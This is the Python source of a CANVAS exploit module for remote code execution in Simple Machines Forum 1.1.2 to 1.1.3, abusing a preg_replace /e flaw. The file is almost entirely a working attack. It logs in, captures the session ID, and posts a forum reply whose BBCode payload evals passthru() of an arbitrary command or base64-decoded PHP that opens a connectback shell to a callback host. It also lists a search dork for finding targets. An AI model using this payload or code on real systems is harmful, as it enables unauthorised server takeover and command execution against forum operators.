#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2008
# http://www.immunityinc.com/CANVAS/ for more information
#

import sys
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from ExploitTypes.php_multi import *

import libs.spkproxy as spkproxy
import canvasengine
import urllib
import re

NAME="Simple Machines Forum 1.1.2 - 1.1.3 Remote Code Execution"
DESCRIPTION="Simple Machines Forum 1.1.2 - 1.1.3 Remote Code Execution"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Simplemachines.org"
DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION["References"]=["None"]
DOCUMENTATION["DORK"]=["Powered by SMF"]

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux" ] , ["Windows"] ]
PROPERTY['VERSION'] = [ "All" ]

NOTES="""
SMF 1.1.2 => 1.1.3 Remote Post Auth Code Execution

Bug was accidently (silently?) patched in 1.1.4

Bug is in:
Subs-Post.php line 230:
// Make sure all tags are lowercase.
$parts[$i] = preg_replace('~\[([/]?)(list|li|table|tr|td)([^\]]*)\]~e', '"[$1" . strtolower("$2") . "$3]"', $parts[$i]);

preg_replace is called with the /e modifier and the back ref is in double quotes allowing the 
evaluation of PHP code in the preg_replace call. the regex does not prevent a user from inserting
evil PHP code.

A user can post a reply to any forum post with the contents of: [list{${phpinfo()}}] and the PHP code will be executed.


XXX: num_replies
"""

CHANGELOG="""
9/23/08 XXX: Moved to new api
"""

class theexploit(php_multi):
    def __init__(self):
        php_multi.__init__(self)
        self.port=80
        self.host=""
        self.setVersions()
        self.version=0
        self.done=0
        self.ssl=""
        self.name=NAME
        self.basepath="/"
        self.basepaths=["/smf113/","/forums/","/board/","/"]
        self.command=None 
        self.basicauth_user=""
        self.basicauth_password=""
        self.user=""
        self.password=""
        self.hostname=None
        self.verb="POST"
        self.content_type="text/plain"
        self.targetpath="index.php"
        self.foundstrings=["SMF"]
        self.testfile="index.php"

        return 

    def request1(self):
        self.log("[+] Logging In")
        data={}
        data["user"]=self.user
        self.log("[+] User: %s Password: %s"%(self.user, self.password))
        if self.version==1:
            self.log("[+] Using password (and blank hash_passwrd)")
            data["passwrd"]=self.password
            data["hash_passwrd"]=""

        else:
            #TODO: Not done here - see above. We may never need
            #anything but version 1 (no hash support)
            self.log("[+] Using hash password")
            data["passwrd"]=""

        data["cookielength"]="-1"
        data=self.UA.POST("index.php?action=login2",data=data)
        #self.log("Data=%s"%data)
        return True

    def request2(self):
        data=self.UA.GET("index.php?action=profile")
        #self.log("Data=%s"%data)
        if data.count("The user whose profile you are trying to view does not exist"):
            self.log("[-] Wrong Username/Password")
            return 0

        #get Session ID
        p=re.compile("sesc=([a-z0-9]{32})")
        match=p.search(data)
        if not match:
            self.log("[-] No session ID detected!")
            return 0
        sid=match.group()[-32:]
        self.log("[+] Sid found: %s"%sid)

        #Get user ID
        p=re.compile("u=(\d+);")
        match=p.search(data)
        if not match:
            self.log("[-] Error getting ID")
            return 0
        #self.log("[+] ID Data: %s"%data)
        id=match.group()[2:].replace(";","")

        self.log("[+] ID Found: %s"%id)
        self.log("[+] Logged in")

        return True

    def request3(self):

        self.log("[+] Sending Exploit Reply")

        if self.command:
            self.log("[+] Command: %s"%self.command)

            command=self.command
            command=self.encode_php(command).strip()


            fields={}
            fields["subject"]="Help"
            fields["message"]="[list{${${print(startz)}}{eval(passthru("+command+"))}{print(endz)}}]"
            data = self.UA.POST("index.php?action=post;topic=1.0;num_replies=1", fields) 
            #self.log("Data=%s"%data)

            if "startz" in data:
                result=data.split("startz")[1].split("endz")[0]
                #self.log("Command data: %s"%prettyprint(data))
                self.log("Command result=%s"%prettyprint(result))
                ret=1
            else:
                self.log("[-] Command not run - service patched?!")
        else:
            command=self.get_php_to_mosdef()
            command=b64encode(command).strip()
            command=self.encode_php(command)

            self.log("[+] Command: %s"%command)

            fields={}
            fields["subject"]="thisisanexploit"
            fields["message"]="[list{${eval(base64_decode("+command+"))}}]"

            data = self.UA.POST("index.php?action=post;topic=1.0",fields)
            self.log("Data=%s"%data)
            self.log("[+] Looking for PHP connectback")

            ret=self.ISucceeded()

        return ret

    def usage(self):
        print "Example: "+sys.argv[0]+" -t 172.16.104.128 -p 80 -O user:temp -O password:password -l 10.10.10.227 -d 9898"
        print "-t <target ip>"
        print "-p <target port>                [optional]"
        print "-O basepath: /path/to/smf/      [optional]"
        print "-O hostname: target vhost       [optional]"
        print "-O command:commandtorun         [optional]"
        print "-O user: forum username"
        print "-O password: forum password"
        print "-l call back ip if doing connect back"
        print "-d listening port for call back"
        return

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
